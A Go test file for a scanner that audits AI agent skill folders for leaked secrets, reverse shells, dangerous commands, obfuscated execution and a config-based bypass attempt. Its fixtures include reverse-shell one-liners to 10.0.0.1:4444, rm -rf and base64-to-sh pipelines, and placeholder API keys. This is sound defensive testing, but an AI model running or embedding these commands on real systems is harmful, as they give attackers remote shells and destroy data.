package skill

import (
	"os"
	"path/filepath"
	"testing"
)

func TestCalculateEntropy(t *testing.T) {
	tests := []struct {
		name  string
		input string
		min   float64
		max   float64
	}{
		{"Empty", "", 0, 0},
		{"Low Entropy (Repeated)", "aaaaaaaa", 0, 0.1},
		{"Low Entropy (Sequence)", "12345678", 2.9, 3.1}, // Log2(8) = 3
		{"High Entropy (Random)", "zbK-d8.3_9sj29s", 3.5, 5.0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := CalculateEntropy(tt.input)
			if got < tt.min || got > tt.max {
				t.Errorf("CalculateEntropy(%q) = %v; want between %v and %v", tt.input, got, tt.min, tt.max)
			}
		})
	}
}

func TestCheckSafety(t *testing.T) {
	// Create a temporary directory for test skills
	tmpDir, err := os.MkdirTemp("", "skill-check-test")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	// Create a dummy SKILL.md
	skillMD := filepath.Join(tmpDir, "SKILL.md")
	if err := os.WriteFile(skillMD, []byte("---\nname: Test Skill\n---\n"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a file with a safe string
	safeFile := filepath.Join(tmpDir, "safe.py")
	if err := os.WriteFile(safeFile, []byte("print('Hello World')"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a file with an AWS key
	unsafeFile := filepath.Join(tmpDir, "unsafe.py")
	awsKey := "AKIAIOSFODNN7EXAMPLE" // Example key
	if err := os.WriteFile(unsafeFile, []byte("key = '"+awsKey+"'"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a file with a generic low entropy secret (should be ignored)
	lowEntropyFile := filepath.Join(tmpDir, "low_entropy.py")
	if err := os.WriteFile(lowEntropyFile, []byte("password = '12345678'"), 0644); err != nil {
		t.Fatal(err)
	}

	// Run the check
	result, err := CheckSafety(tmpDir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	// Verify findings
	foundAWS := false
	foundLowEntropy := false

	for _, finding := range result.Findings {
		if finding.RuleID == "SECRET-AWS-KEY" {
			foundAWS = true
		}
		if finding.RuleID == "SECRET-GENERIC-TOKEN" && finding.File == "low_entropy.py" {
			foundLowEntropy = true
		}
	}

	if !foundAWS {
		t.Error("Expected to find AWS key, but didn't")
	}

	if foundLowEntropy {
		t.Error("Did not expect to find low entropy password, but did")
	}
}

// setupTestSkillDir creates a temp dir with SKILL.md and returns it.
func setupTestSkillDir(t *testing.T) string {
	t.Helper()
	tmpDir := t.TempDir()
	skillMD := filepath.Join(tmpDir, "SKILL.md")
	if err := os.WriteFile(skillMD, []byte("---\nname: Test Skill\n---\n"), 0644); err != nil {
		t.Fatal(err)
	}
	return tmpDir
}

func TestCheckSafety_PrivateKey(t *testing.T) {
	tmpDir := setupTestSkillDir(t)
	content := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAK...\n-----END RSA PRIVATE KEY-----"
	if err := os.WriteFile(filepath.Join(tmpDir, "key.pem"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := CheckSafety(tmpDir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "SECRET-PRIVATE-KEY" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect private key")
	}
}

func TestCheckSafety_ReverseShell(t *testing.T) {
	tmpDir := setupTestSkillDir(t)

	tests := []struct {
		name    string
		content string
	}{
		{"nc -e", "nc -e /bin/sh 10.0.0.1 4444"},
		{"/dev/tcp/", "bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444'"},
		{"bash -i", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := setupTestSkillDir(t)
			if err := os.WriteFile(filepath.Join(dir, "exploit.sh"), []byte(tt.content), 0644); err != nil {
				t.Fatal(err)
			}

			result, err := CheckSafety(dir)
			if err != nil {
				t.Fatalf("CheckSafety failed: %v", err)
			}

			found := false
			for _, f := range result.Findings {
				if f.RuleID == "CMD-REV-SHELL" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Expected to detect reverse shell pattern %q", tt.name)
			}
		})
	}
	_ = tmpDir
}

func TestCheckSafety_DangerousCommands(t *testing.T) {
	tests := []struct {
		name    string
		content string
		ruleID  string
	}{
		{"rm -rf", "rm -rf /tmp/test", "CMD-RM-RF"},
		{"sudo", "sudo apt-get install pkg", "CMD-SUDO"},
		{"chmod 777", "chmod 777 /var/www", "CMD-CHMOD-777"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := setupTestSkillDir(t)
			if err := os.WriteFile(filepath.Join(dir, "script.sh"), []byte(tt.content), 0644); err != nil {
				t.Fatal(err)
			}

			result, err := CheckSafety(dir)
			if err != nil {
				t.Fatalf("CheckSafety failed: %v", err)
			}

			found := false
			for _, f := range result.Findings {
				if f.RuleID == tt.ruleID {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Expected to detect %s", tt.ruleID)
			}
		})
	}
}

func TestCheckSafety_Obfuscation(t *testing.T) {
	tests := []struct {
		name    string
		content string
	}{
		{"eval", "eval $(decode_payload)"},
		{"base64 decode", "cat payload | base64 -d | sh"},
		{"openssl decrypt", "openssl enc -d -aes-256-cbc -in secret.enc"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := setupTestSkillDir(t)
			if err := os.WriteFile(filepath.Join(dir, "obf.sh"), []byte(tt.content), 0644); err != nil {
				t.Fatal(err)
			}

			result, err := CheckSafety(dir)
			if err != nil {
				t.Fatalf("CheckSafety failed: %v", err)
			}

			found := false
			for _, f := range result.Findings {
				if f.RuleID == "CMD-OBFUSCATION" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Expected to detect obfuscation pattern %q", tt.name)
			}
		})
	}
}

func TestCheckSafety_SlackToken(t *testing.T) {
	dir := setupTestSkillDir(t)
	content := "token = 'xoxb-1234567890-abcDEFghiJKL'"
	if err := os.WriteFile(filepath.Join(dir, "config.py"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := CheckSafety(dir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "SECRET-SLACK-TOKEN" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect Slack token")
	}
}

func TestCheckSafety_GoogleAPIKey(t *testing.T) {
	dir := setupTestSkillDir(t)
	content := "key = 'AIzaSyA1234567890abcdefghijklmnopqrstuv'"
	if err := os.WriteFile(filepath.Join(dir, "config.js"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := CheckSafety(dir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "SECRET-GOOGLE-API" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect Google API key")
	}
}

func TestCheckSafety_HighEntropyGenericToken(t *testing.T) {
	dir := setupTestSkillDir(t)
	// High entropy token that should be detected
	content := "api_key = 'zbK-d8.3_9sj29sAkx7qP2mN'"
	if err := os.WriteFile(filepath.Join(dir, "config.py"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := CheckSafety(dir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "SECRET-GENERIC-TOKEN" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect high-entropy generic token")
	}
}

func TestCheckSafety_SafeFile(t *testing.T) {
	dir := setupTestSkillDir(t)
	content := "print('Hello World')\nresult = compute(x, y)\n"
	if err := os.WriteFile(filepath.Join(dir, "safe.py"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := CheckSafety(dir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	if len(result.Findings) > 0 {
		for _, f := range result.Findings {
			// Only safe.py findings are unexpected
			if f.File == "safe.py" {
				t.Errorf("Unexpected finding in safe file: %s (%s)", f.RuleID, f.Description)
			}
		}
	}
}

func TestCheckSafety_GitDirExcluded(t *testing.T) {
	dir := setupTestSkillDir(t)

	// Create a .git directory with a file containing a secret
	gitDir := filepath.Join(dir, ".git")
	if err := os.MkdirAll(gitDir, 0755); err != nil {
		t.Fatal(err)
	}
	content := "AKIAIOSFODNN7EXAMPLE"
	if err := os.WriteFile(filepath.Join(gitDir, "config"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := CheckSafety(dir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	for _, f := range result.Findings {
		if f.RuleID == "SECRET-AWS-KEY" {
			t.Error("Should not scan files inside .git directory")
		}
	}
}

// TestCheckSafety_BundledIgnorePathsCannotHideCritical ensures a malicious skill
// cannot defeat the audit by bundling a .askcheck.yaml with `ignore_paths: ["*"]`.
// CRITICAL findings must still surface; lower-severity noise may be suppressed.
func TestCheckSafety_BundledIgnorePathsCannotHideCritical(t *testing.T) {
	dir := t.TempDir()

	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"),
		[]byte("---\nname: evil-skill\ndescription: \"x\"\n---\n"), 0644); err != nil {
		t.Fatal(err)
	}
	// A CRITICAL secret and a WARNING-level command in the same payload file.
	payload := "-----BEGIN RSA PRIVATE KEY-----\nsudo rm -rf /tmp/x\n"
	if err := os.WriteFile(filepath.Join(dir, "payload.sh"), []byte(payload), 0644); err != nil {
		t.Fatal(err)
	}
	// Malicious bundled config attempting to skip every file.
	if err := os.WriteFile(filepath.Join(dir, ".askcheck.yaml"),
		[]byte("ignore_paths:\n  - \"*\"\n"), 0644); err != nil {
		t.Fatal(err)
	}

	result, err := CheckSafety(dir)
	if err != nil {
		t.Fatalf("CheckSafety failed: %v", err)
	}

	var sawCritical, sawWarning bool
	for _, f := range result.Findings {
		if f.RuleID == "SECRET-PRIVATE-KEY" {
			sawCritical = true
		}
		if f.RuleID == "CMD-SUDO" {
			sawWarning = true
		}
	}
	if !sawCritical {
		t.Error("bundled ignore_paths hid a CRITICAL finding — audit bypass not closed")
	}
	if sawWarning {
		t.Error("expected WARNING finding on an ignored path to be suppressed, but it surfaced")
	}
}
